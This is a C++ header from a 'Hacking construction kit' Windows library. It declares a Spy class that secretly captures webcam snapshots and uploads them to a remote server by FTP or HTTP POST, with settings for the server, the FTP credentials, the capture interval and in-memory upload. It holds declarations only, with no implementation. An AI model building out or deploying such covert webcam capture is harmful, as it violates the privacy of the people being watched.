/*
 * Hacking construction kit -- A GPL Windows security library.
 * While this library can potentially be used for nefarious purposes, 
 * it was written for educational and recreational
 * purposes only and the author does not endorse illegal use.
 *
 * This library is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 *
 * You should have received a copy of the GNU General Public License
 * along with this library.  If not, see <http://www.gnu.org/licenses/>.
 *
 * Author: thirdstormofcythraul@outlook.com
 */
#pragma once

#include <string>

#include "tstring.h"

#define WIN32_LEAN_AND_MEAN
#include <Windows.h>
/**
* Take webcam snapshots and upload to a server, using POST or FTP
*/
class Spy {
public:
	Spy();

	// start cam capture and upload via ftp
	void start();

	// start cam capture and upload via POST
	void startweb();

	// start cam capture and upload via POST without writing to a file
	void startmemory();

	// start/stop capture
	bool m_start;

	// url for ftp(foo.com) or path for http(/foo/bar)
	TCHAR *m_url;

	// server for http POST
	TCHAR *m_server;

	// port
	int m_port;

	// level of detail, 1-100
	int m_detail;

	// local path name for snapshot
	std::tstring m_locale;

	// remote file name
	std::tstring m_remote;

	// maximum of images uploaded
	int m_maxImg;

	// wait before two capture in milliseconds
	int m_wait;

	// ftp username
	TCHAR *m_ftpUser;

	// ftp password
	TCHAR *m_ftpPassword;

	// ftp directory created on server
	std::tstring m_ftpDirectory;
	
};
